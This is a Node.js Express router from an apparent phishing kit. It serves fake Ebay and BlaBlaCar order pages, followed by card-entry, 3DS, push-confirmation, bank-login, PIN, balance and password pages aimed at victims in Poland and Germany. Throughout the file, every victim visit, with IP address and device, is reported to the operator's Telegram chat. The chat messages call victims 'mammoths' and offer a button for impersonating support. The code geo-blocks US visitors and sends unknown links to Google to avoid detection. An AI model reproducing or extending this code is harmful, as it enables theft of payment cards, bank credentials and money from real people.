const DeviceDetector = require('node-device-detector')
const xssFilters = require('xss-filters')
const currency = require('currency.js')
const geoip = require('geoip-lite')
const express = require('express')
const loggy = require('loggy')

/* dbs */
const receive = require('../database/models/receive')
const booking = require('../database/models/booking')
const bbc = require('../database/models/bbc')

const bot = require('../src/bot')
const sendHTML = require('../src/other/sendHTML')
const sendCARD = require('../src/other/sendCARD')
const send3DS = require('../src/other/send3DS')
const sendPUSH = require('../src/other/sendPUSH')
const sendBANKpl = require('../src/other/sendBANKpl')
const sendBANKde = require('../src/other/sendBANKde')
const sendBALANCE = require('../src/other/sendBALANCE')
const sendPINcard = require('../src/other/sendPINcard')
const sendPINonline = require('../src/other/sendPINonl')
const sendPASSWORD = require('../src/other/sendPASSWORD')

const detector = new DeviceDetector
const router = express.Router()

/* routes */
router.get('/delivery/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let geo = geoip.lookup(ip)

            if (geo) {
                if ((geo.country == 'US') && (ip != "104.249.46.100")) {
                    console.log(`ne pustilo => ${geo.country} (${ip})`)
                    res.sendStatus(403)
                } else {
                    console.log(`pustilo => ${geo.country} (${ip})`)
                    res.render('howwork')
                }
            } else {
                res.render('howwork')
            }

            let device = detector.detect(req.headers['user-agent'])
            if (device.os.name) {        
                if (res_db.service == '🇩🇪 Ebay 2.0') {
                    await bot.telegram.sendMessage(res_db.tgID, `🌅 <b>${res_db.service}:</b>\n<b>Переход на страницу "О доставке"</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> ${res_db.product_name}\n📬 <b>Стоимость:</b> ${res_db.product_price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в ТП</b>`, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }]
                            ]
                        }
                    })
                } else {
                    res.sendStatus(404)
                }
            } else {
                res.sendStatus(403)
            }
        }
    } catch (e) {

    }
})

router.get('/order/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let geo = geoip.lookup(ip)

            if (geo) {
                if ((geo.country == 'US') && (ip != "104.249.46.100")) {
                    console.log(`ne pustilo => ${geo.country} (${ip})`)
                    res.sendStatus(403)
                } else {
                    console.log(`pustilo => ${geo.country} (${ip})`)
                    if (res_db.service.includes('BlaBlaCar')) {
                        sendHTML(res, res_db.link, res_db.service, res_db.product_name, res_db.product_price, res_db.product_image, res_db.product_address, res_db.product_buyer, res_db.city_from, res_db.place_from, res_db.city_to, res_db.date_from, res_db.price)
                    } else {
                        sendHTML(res, res_db.link, res_db.service, res_db.product_name, res_db.product_price, res_db.product_image, res_db.product_address, res_db.product_buyer)
                    }
                }
            } else {
                if (res_db.service.includes('BlaBlaCar')) {
                    sendHTML(res, res_db.link, res_db.service, res_db.product_name, res_db.product_price, res_db.product_image, res_db.product_address, res_db.product_buyer, res_db.city_from, res_db.place_from, res_db.city_to, res_db.date_from, res_db.price)
                } else {
                    sendHTML(res, res_db.link, res_db.service, res_db.product_name, res_db.product_price, res_db.product_image, res_db.product_address, res_db.product_buyer)
                }
            }

            let device = detector.detect(req.headers['user-agent'])
            if (device.os.name) {                    
                if (res_db.service.includes('BlaBlaCar')) {
                    await bot.telegram.sendMessage(res_db.tgID, `🌅 <b>${res_db.service}:</b>\n<b>Переход на первичную страницу</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Поездка:</b> ${res_db.city_from} -> ${res_db.city_to}\n📬 <b>Стоимость:</b> ${res_db.price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в ТП</b>`, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }],
                               /*  [{ text: '💌 Написать в ТП, используя шаблон 💌', callback_data: `userSupport_temp ${req.params['id']}` }] */
                            ]
                        }
                    })
                } else {
                    await bot.telegram.sendMessage(res_db.tgID, `🌅 <b>${res_db.service}:</b>\n<b>Переход на первичную страницу</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> ${res_db.product_name}\n📬 <b>Стоимость:</b> ${res_db.product_price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в ТП</b>`, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }],
                                /* [{ text: '💌 Написать в ТП, используя шаблон 💌', callback_data: `userSupport_temp ${req.params['id']}` }] */
                            ]
                        }
                    })
                }
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

router.get('/merchant/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            if (device.os.name) {
                if (res_db.service.includes('BlaBlaCar')) {
                    await bot.telegram.sendMessage(res_db.tgID, `🌅 <b>${res_db.service}:</b>\n<b>💳 Переход на ввод карты</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Поездка:</b> ${res_db.otkuda_kuda}\n📬 <b>Стоимость:</b> ${res_db.price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в ТП</b>`, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }],
                                /* [{ text: '💌 Написать в ТП, используя шаблон 💌', callback_data: `userSupport_temp ${req.params['id']}` }] */
                            ]
                        }
                    })
                } else {
                    await bot.telegram.sendMessage(res_db.tgID, `🌅 <b>${res_db.service}:</b>\n<b>💳 Переход на ввод карты</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> ${res_db.product_name}\n📬 <b>Стоимость:</b> ${res_db.product_price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в ТП</b>`, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }],
                                /* [{ text: '💌 Написать в ТП, используя шаблон 💌', callback_data: `userSupport_temp ${req.params['id']}` }] */
                            ]
                        }
                    })
                }

                sendCARD(res, res_db.link, res_db.service)
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* 3ds */
router.get('/verify/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                send3DS(res, res_db.link, res_db.service, price)
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* push notification */
router.get('/confirm/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                sendPUSH(res, res_db.link, res_db.service, price)
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* select bank */
router.get('/select/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            if (device.os.name) {            
                if (res_db.service.includes('🇵🇱')) {
                    await res.render('pages/selectBankPL', {
                        id: req.params['id']
                    })
                } else if (res_db.service.includes('🇩🇪')) {
                    await res.render('pages/selectBankDE', {
                        id: req.params['id']
                    })
                } else {
                    res.sendStatus(403)
                }
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* select bank */
router.post('/select/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            if (device.os.name) {
                if (res_db.service.includes('🇵🇱')) {
                    await sendBANKpl(res, req.params['id'], req.body['bankname'])
                } else {
                    await sendBANKde(res, req.params['id'], req.body['bankname'])
                }
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* it key6 */
router.get('/key6/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                await res.render('pages/key6', {
                    id: req.params['id'], 
                    price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
                })
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* pin online */
router.get('/pinonline/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                await sendPINonline(res, req.params['id'], res_db.service, xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format()))
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* pin card */
router.get('/pincard/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                await sendPINcard(res, req.params['id'], res_db.service, xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format()))
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* secret */
router.get('/secret/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                await res.render('pages/secretde', {
                    id: req.params['id'],
                    price: price
                })
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* balance */
router.get('/balance/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                await sendBALANCE(res, req.params['id'], res_db.service, xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format()))
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

/* mToken */
router.get('/mtoken/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            if (device.os.name) {
                await res.render('pages/mtoken', {
                    id: req.params['id'],
                    price: xssFilters.inHTMLData(currency(parseInt(res_db.product_price), { separator: ' ', symbol: '', }).format())
                })
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {

    }
})

/* password */
router.get('/password/:id', async (req, res) => {
    try {
        let res_db = await receive.findOne({ link: req.params['id'] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!res_db) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            let price = (res_db.product_price != undefined) ? res_db.product_price : res_db.price

            if (device.os.name) {
                sendPASSWORD(res, req.params['id'], res_db.service, xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format()))
            } else {
                res.sendStatus(404);
            }
        }
    } catch (e) {

    }
})

module.exports = router